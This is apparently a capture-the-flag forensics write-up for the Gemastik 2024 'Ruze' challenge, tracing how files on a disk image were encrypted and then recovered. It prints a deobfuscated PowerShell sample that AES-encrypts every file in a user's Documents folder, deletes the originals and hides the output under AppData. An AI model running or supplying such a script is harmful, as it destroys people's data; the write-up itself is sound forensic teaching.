---
title: "Gemastik Qualification 2024 - Ruze Writeup"
pubDate: "2024-10-02"
description: 'Gemastik Qualification 2024 Ruze Forensic Write Up'
---

## Forensics/Ruze

(I use FTKImager to mount the image, use autopsy for analysis). Found encrypted pdf file, there are other two but its a video, so i think this is the flag

![{ECB4EDC1-F0AF-4AC0-932B-F8FF5B9FDE0F}](https://github.com/user-attachments/assets/ecc16bf9-1093-4c15-82b8-d622a9363e6c)

Found .bat containing base64 encoded strings, decode it we will get some script that will encrypt the data
![{8395F048-43EE-47F1-91C6-109A70851454}](https://github.com/user-attachments/assets/1a1a5332-5ebb-470e-a279-6a09b979f1a5)

Deobfuscated by ChatGPT
```powershell
function Encrypt-File {

    param (
        [string]$inputFilePath,
        [string]$outputFilePath,
        [string]$encryptionKey,
        [string]$initializationVector
    )

    # Convert the key and IV to byte arrays
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
    $ivBytes =

[System.Text.Encoding]::UTF8.GetBytes($initializationVector)
    # Validate key and IV lengths
    if ($keyBytes.Length -ne 16 -and $keyBytes.Length -ne 24 -and
$keyBytes.Length -ne 32) {
        throw "ERROR: Invalid key length."
    }

    if ($ivBytes.Length -ne 16) {
        throw "ERROR: Invalid IV length."
    }

    # Create AES encryptor
    $aes = New-Object "System.Security.Cryptography.AesManaged"
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Read the input file bytes
    $fileBytes = [System.IO.File]::ReadAllBytes($inputFilePath)
    # Encrypt the file bytes
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)

    # Combine IV and encrypted data
    [byte[]]$finalBytes = $aes.IV + $encryptedBytes
    # Write the encrypted bytes to the output file
    [System.IO.File]::WriteAllBytes($outputFilePath, $finalBytes)
    # Clean up
    $aes.Dispose()

    Write-Output "Encrypted file: $outputFilePath"
    Remove-Item -Path $inputFilePath
}

# Define paths

$documentsPath = "C:\Users\$Env:UserName\Documents"
$encryptedFilesPath =
"C:\Users\$Env:UserName\AppData\Local\Microsoft\Garage"

# Create the directory for encrypted files if it doesn't exist
if (-not (Test-Path -Path $encryptedFilesPath)) {
    New-Item -Path $encryptedFilesPath -ItemType Directory -ErrorActionStop
}

# Get the encryption key and IV from the registry
$registryPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\02e7a9afbb77"
$encryptionKey = (Get-ItemProperty -Path $registryPath -Name "59e2beee1b06")."59e2beee1b06"
$initializationVector = (Get-ItemProperty -Path $registryPath -Name "076a2843f321")."076a2843f321"

# Encrypt each file in the Documents folder

Get-ChildItem -Path $documentsPath -File | ForEach-Object {
    $inputFilePath = $_.FullName
    $outputFilePath = Join-Path -Path $encryptedFilesPath -ChildPath$_.Name
    Encrypt-File -inputFilePath $inputFilePath -outputFilePath

$outputFilePath -encryptionKey $encryptionKey -initializationVector
$initializationVector
}

Write-Output "All files encrypted."
```

Notice that the key and IV Stored in here: `$registryPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\02e7a9afbb77"`
![{AA4917C7-E96E-4376-93DE-1A7437047C0A}](https://github.com/user-attachments/assets/f63087fb-bd29-4bc1-9e6c-06bfee89617a)

But if you read the hex of the encrypted file, you will see the iv is appended at the beginning of the file (just as the script tells us). So clean it. And decrypt it using the key and IV. I use Cyberchef bcs of skill issues at scripting.
![{556402A2-F4C3-4639-80CD-CE4580B5A856}](https://github.com/user-attachments/assets/7c39e95c-11cb-470b-92e2-7397928cbfe3)
![{352A97E1-E587-47EF-9ACE-9B9A761250DD}](https://github.com/user-attachments/assets/226674c2-db4f-402e-be8e-f48eccc7984c)

